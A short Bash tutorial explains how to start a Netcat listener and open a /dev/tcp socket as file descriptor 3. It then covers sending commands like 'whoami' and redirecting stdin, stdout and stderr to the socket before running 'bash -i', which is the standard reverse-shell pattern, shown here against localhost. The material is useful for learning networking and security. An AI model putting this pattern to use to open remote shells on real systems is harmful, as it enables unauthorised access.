
This document outlines the steps from starting a Netcat listener to using file descriptors and redirections in Bash to interact with the connection.

---

## 1. Start the Netcat listener
```bash
nc -lvnp 4444
```
- Listens on port 4444 for incoming connections.

## 2. Establish the connection
- A client (e.g., another `nc`) connects to `localhost:4444`.
- Netcat accepts the connection and opens a communication channel.

## 3. Open a file descriptor in Bash
```bash
exec 3<>/dev/tcp/localhost/4444
```
- Creates file descriptor **3** in read/write mode.
- Connects the pseudo-file `/dev/tcp/host/port` to a TCP socket.

## 4. Send commands to the server
```bash
echo "whoami" >&3
echo "ls -lah" >&3
```
- Redirects the output of `echo` to descriptor 3, sending commands to the remote host.

## 5. Read the response
```bash
read -u 3 response
echo "$response"
# or read multiple lines
cat <&3
```
- `read -u 3` reads one line from descriptor 3.
- `cat <&3` displays everything arriving on the socket.

## 6. Merge the socket with an interactive shell
```bash
# Redirect stdin/stdout/stderr to the socket
exec 0<&3
exec 1>&3
exec 2>&3

# Start bash in interactive mode
bash -i
```
- Your local shell communicates directly with the remote host, with TTY support.

## 7. Multiplex I/O with `tee`
```bash
# Send a command and view it locally
echo "id" | tee /dev/tty >&3

# Display the response and log it
cat <&3 | tee /dev/tty
```

## 8. Close the channel
```bash
exec 3<&-
exec 3>&-
```
- Closes descriptor 3 and ends the connection.

---

**End of summary.**
